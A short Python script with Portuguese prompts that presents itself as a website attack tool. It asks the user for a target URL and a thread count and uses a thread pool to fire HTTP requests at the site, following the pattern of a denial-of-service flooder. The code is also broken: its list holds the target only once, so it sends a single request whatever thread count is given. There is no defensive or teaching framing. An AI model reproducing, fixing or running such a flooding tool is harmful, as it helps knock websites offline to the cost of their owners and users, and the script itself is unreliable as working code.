import requests
from multiprocessing.dummy import Pool

def attack(url):
    try:
        response = requests.get(url)
        print(f"Request to {url} completed with status code {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    # Interface de configuração
    print("\033[1;31mConfigurações do ataque\033[0m")
    url = input("Informe a URL para atacar: ")
    num_threads = int(input("Informe o número de threads para executar o ataque: "))

    if num_threads > 250:
        print("\033[1;31m250 threads são recomendadas para evitar travamento no dispositivo que esta executando o codigo.\033[0m")
        choice = input("Deseja continuar mesmo assim? (y/n): ")
        if choice.lower() != "y":
            print("Ataque interrompido.")
            exit()

    # Lista de URLs para atacar
    urls = [url]

    # Cria um grupo de threads
    pool = Pool(num_threads)

    # Ataca as URLs usando as threads simultaneamente
    pool.map(attack, urls)

    # Fecha o grupo de threads
    pool.close()
    pool.join()
